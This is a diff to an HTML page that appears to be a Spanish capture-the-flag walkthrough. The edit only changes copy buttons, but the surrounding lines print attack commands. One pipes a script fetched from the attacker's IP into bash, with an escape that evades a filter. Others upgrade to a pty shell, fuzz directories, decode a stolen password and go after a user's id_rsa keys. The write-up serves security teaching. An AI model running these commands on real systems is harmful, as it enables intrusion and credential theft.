@@ -95,7 +95,7 @@ Ahora, en la web vamos a ejecutar el comando:
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
   </div>
@@ -146,7 +146,7 @@ Si ejecutamos el comando especificando el usuario `-u apaar` y en el mensaje esc
       <div class="code-container">
           <div class="code-header">
             Bash
-            <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+            <button class="copy-button" data-code="bash">Copiar</button>
           </div>
           <pre><code class="language-bash" >python3 -c 'import pty; pty.spawn("/bin/bash)'
 (ctrl + Z)
@@ -191,7 +191,7 @@ Pero primero, vamos a volver a hacer *fuzzing web* a esta web:
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >gobuster dir -u ip_maquina:9001 -w /ruta_wordlist</code></pre>
   </div>
@@ -206,7 +206,7 @@ Ahora nos descargamos el archivo:
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >wget hacker-with-laptop_23-2147985341.jpg</code></pre>
   </div>
@@ -225,7 +225,7 @@ Tenemos la contraseña del '.zip', vamos a abrirlo:
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >unzip backup.zip
 nano source_code.php</code></pre>
@@ -243,7 +243,7 @@ Encontramos la contraseña del otro usuario <strong>Anurodh</strong>, la cual es
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >echo -e "contraseña_base64" | base64 -d</code></pre>
   </div>
@@ -254,7 +254,7 @@ Ahora sí, vamos a proceder a obtener las claves *id_rsa* del usuario <strong>ap
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="bash">Copiar</button>
     </div>
     <pre><code class="language-bash" >cd /home/apaar/.shh</code></pre>
   </div>
